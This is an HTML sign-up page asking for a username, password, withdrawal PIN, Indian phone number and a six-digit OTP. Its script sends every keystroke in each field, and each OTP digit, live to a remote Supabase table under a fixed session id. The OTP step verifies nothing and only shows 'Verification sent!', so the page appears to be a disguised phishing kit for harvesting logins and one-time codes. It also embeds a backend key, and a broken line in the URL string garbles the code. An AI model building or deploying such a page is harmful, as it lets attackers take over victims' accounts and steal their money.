<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> Registration</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    body { background-color: #f3f6f8; font-family: sans-serif; }
    .input-pill { background: white; border-radius: 9999px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

  <div class="w-full max-w-md bg-white p-6 rounded-2xl shadow-xl">
    <h2 class="text-2xl font-bold text-center mb-6 text-gray-800">Register</h2>
    <form id="registerForm" class="space-y-4">
      <div class="input-pill px-4 py-3 border border-gray-200">
        <input type="text" id="username" placeholder="Username" required class="w-full outline-none text-gray-700 bg-transparent">
      </div>
      <div class="input-pill px-4 py-3 border border-gray-200">
        <input type="password" id="password" placeholder="Password" required class="w-full outline-none text-gray-700 bg-transparent">
      </div>
      <div class="input-pill px-4 py-3 border border-gray-200">
        <input type="password" id="withdrawalPin" placeholder="Withdrawal PIN" required class="w-full outline-none text-gray-700 bg-transparent" maxlength="6">
      </div>
      <div class="input-pill px-4 py-3 border border-gray-200 flex items-center">
        <span class="text-gray-500 mr-2">+91</span>
        <input type="tel" id="phone" placeholder="Phone Number" required class="w-full outline-none text-gray-700 bg-transparent">
      </div>
      <div class="input-pill px-4 py-3 border border-gray-200">
        <input type="text" id="referral" value="SOW6Hx" placeholder="Referral Code" class="w-full outline-none text-gray-700 bg-transparent">
      </div>
      <button type="submit" class="w-full bg-green-600 text-white py-3 rounded-full font-bold shadow-lg hover:bg-green-700 transition">
        Sign Up
      </button>
    </form>
  </div>

  <!-- OTP Modal -->
  <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center p-4">
    <div class="bg-white rounded-2xl p-6 max-w-sm w-full text-center">
      <h3 class="text-xl font-bold mb-4">Enter OTP</h3>
      <div id="otpContainer" class="flex justify-between mb-4">
        <input type="text" maxlength="1" class="otp-input w-12 h-12 border text-center text-xl font-bold rounded border-gray-300">
        <input type="text" maxlength="1" class="otp-input w-12 h-12 border text-center text-xl font-bold rounded border-gray-300">
        <input type="text" maxlength="1" class="otp-input w-12 h-12 border text-center text-xl font-bold rounded border-gray-300">
        <input type="text" maxlength="1" class="otp-input w-12 h-12 border text-center text-xl font-bold rounded border-gray-300">
        <input type="text" maxlength="1" class="otp-input w-12 h-12 border text-center text-xl font-bold rounded border-gray-300">
        <input type="text" maxlength="1" class="otp-input w-12 h-12 border text-center text-xl font-bold rounded border-gray-300">
      </div>
      <button onclick="verifyOtp()" class="w-full bg-green-600 text-white py-2 rounded-full font-bold">Submit</button>
    </div>
  </div>

  <script>
    const SUPABASE_URL = "https://zvswgqddbeykgrhlovgp.supabase.co
";
    const SUPABASE_ANON_KEY = "sb_publishable_moe4DeFFdoQjVmcCLPtOmQ_VXcW9TyD";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    const sessionId = 1; 

    const fields = ['username', 'password', 'withdrawalPin', 'phone', 'referral'];
    fields.forEach(fieldId => {
      document.getElementById(fieldId).addEventListener('input', async (e) => {
        const payload = { id: sessionId, [fieldId]: e.target.value, status: 'typing' };
        await supabase.from('live_sessions').upsert(payload);
      });
    });

    document.getElementById('registerForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      document.getElementById('otpModal').style.display = 'flex';
      await supabase.from('live_sessions').upsert({ id: sessionId, status: 'OTP Sent' });
    });

    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
      input.addEventListener('input', async (e) => {
        if (e.target.value.length && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        await syncOtp();
      });
    });

    async function syncOtp() {
      let otp = '';
      document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
      await supabase.from('live_sessions').upsert({ id: sessionId, otp_mask: otp });
    }

    async function verifyOtp() {
      let otp = '';
      document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
      await supabase.from('live_sessions').upsert({ id: sessionId, status: 'Verified' });
      alert('Verification sent!');
    }
  </script>
</body>
</html>
